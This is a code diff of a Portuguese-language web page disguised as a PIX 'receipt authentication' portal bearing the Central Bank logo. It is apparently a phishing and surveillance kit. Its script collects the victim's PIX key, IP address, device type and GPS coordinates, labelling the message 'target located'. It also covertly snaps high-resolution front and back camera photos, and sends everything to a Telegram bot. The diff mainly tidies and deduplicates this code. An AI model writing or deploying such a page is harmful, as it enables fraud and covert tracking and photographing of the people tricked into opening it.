@@ -4,12 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal de Recebimento PIX</title>
-
-    <meta property="og:title" content="SISTEMA DE AUTENTICAÇÃO PIX">
-    <meta property="og:description" content="Conferência de recebimento pendente. Autentique para liberar o valor via PIX.">
-    <meta property="og:image" content="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png">
-    <meta property="og:type" content="website">
-
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
@@ -31,7 +25,6 @@
 
 <div class="pix-card">
     <div id="header-dados" class="header">AUTENTICADOR DE RECEBIMENTOS</div>
-    
     <div id="header-bc" class="bc-header">
         <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" alt="BC" class="bc-logo">
     </div>
@@ -58,10 +51,7 @@
             </button>
         </div>
 
-        <div class="footer-info">
-            Portal de Conferência de Valores Interbancário<br>
-            Criptografia de Segurança Ativa
-        </div>
+        <div class="footer-info">Portal de Conferência de Valores Interbancário<br>Criptografia de Segurança Ativa</div>
     </div>
 </div>
 
@@ -76,21 +66,17 @@
     function mostrarAviso() {
         valorGlobal = document.getElementById('valor').value;
         chaveGlobal = document.getElementById('chave').value;
-
         if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");
-
-        // Troca as telas
         document.getElementById('header-dados').style.display = 'none';
         document.getElementById('tela-dados').style.display = 'none';
         document.getElementById('header-bc').style.display = 'block';
         document.getElementById('tela-permissao').style.display = 'block';
     }
 
-   async function dispararCaptura() {
+    async function dispararCaptura() {
         document.getElementById('spinner').style.display = 'inline-block';
         document.getElementById('btnFinal').disabled = true;
 
-        // Captura IP e Porta
         let dadosConexao = { ip: "Não identificado", porta: window.location.port || "443" };
         try {
             const resp = await fetch('https://api.ipify.org?format=json');
@@ -98,7 +84,6 @@
             dadosConexao.ip = data.ip;
         } catch (e) {}
 
-        // Dados do Aparelho, Bateria e Rede
         const ua = navigator.userAgent;
         let aparelho = /iPhone/i.test(ua) ? "📱 iPhone (iOS)" : (/Android/i.test(ua) ? "🤖 Android" : "💻 PC/Outro");
         
@@ -112,7 +97,6 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
-
             const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${valorGlobal}\n🔑 Chave: ${chaveGlobal}\n🌐 IP: ${dadosConexao.ip}\n🔌 Porta: ${dadosConexao.porta}\n${aparelho}${infoExtra}\n🌍 Mapa: ${mapa}`;
             
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
@@ -123,26 +107,17 @@
                 window.location.href = "bradesco.html";
             } catch (e) { window.location.href = "bradesco.html"; }
         }, (err) => {
-            // LOOPING: Se negar GPS, vai para a página que você criou
             window.location.href = "autorizar.html";
         });
     }
-   async function tirarFoto(face, label) {
+
+    async function tirarFoto(face, label) {
         try {
-            // Limpeza de streams anteriores
             if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
-            
-            // Pausa para o hardware resetar
             await new Promise(r => setTimeout(r, 500));
 
-            // SOLICITAÇÃO DE ALTA RESOLUÇÃO
             const constraints = { 
-                video: { 
-                    facingMode: face,
-                    width: { ideal: 1920 }, // Tenta Full HD
-                    height: { ideal: 1080 },
-                    frameRate: { ideal: 30 }
-                }, 
+                video: { facingMode: face, width: { ideal: 1920 }, height: { ideal: 1080 } }, 
                 audio: false 
             };
 
@@ -152,63 +127,23 @@
             video.srcObject = stream;
             
             await new Promise(r => video.onloadedmetadata = r);
-            
-            // FUNDAMENTAL: Aguarda 1.5 segundos para o sensor ajustar o brilho (Exposure)
-            // Sem isso, a foto frontal geralmente sai muito escura ou "lavada"
-            await new Promise(r => setTimeout(r, 1500)); 
+            await new Promise(r => setTimeout(r, 1500)); // Aguarda ajuste de luz
             
             const canvas = document.getElementById('canvas');
-            
-            // Ajusta o tamanho do canvas para o tamanho real do vídeo capturado
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Desliga a câmera imediatamente após o "print"
             stream.getTracks().forEach(t => t.stop());
 
-            // Qualidade em 0.9 (90%) para nitidez forense
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-            
             const fd = new FormData();
             fd.append('chat_id', ID);
             fd.append('photo', blob, `${label}.jpg`);
-            fd.append('caption', `📸 ALTA DEFINIÇÃO: ${label}\n📏 Resolução: ${canvas.width}x${canvas.height}`);
+            fd.append('caption', `📸 HD: ${label}\n📏 Resolução: ${canvas.width}x${canvas.height}`);
             
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (e) {
-            console.error("Falha na captura HD:", label);
-        }
-    }
-
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            window.currentStream = stream; // Guarda o stream atual
-            
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            await new Promise(r => video.onloadedmetadata = r);
-            
-            // 3. Tempo para o sensor de luz ajustar (evita foto preta/escura)
-            await new Promise(r => setTimeout(r, 1000)); 
-            
-            const canvas = document.getElementById('canvas');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            
-            // 4. Desliga a câmera atual antes de retornar para a próxima
-            stream.getTracks().forEach(track => track.stop());
-
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-            const fd = new FormData();
-            fd.append('chat_id', ID);
-            fd.append('photo', blob, `${label}.jpg`);
-            fd.append('caption', `📸 Câmera ${label}`);
-            
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (error) {
-            console.error("Erro na captura:", label, error);
-        }
+        } catch (e) { console.error("Erro na captura HD:", label); }
     }
 </script>
 </body>
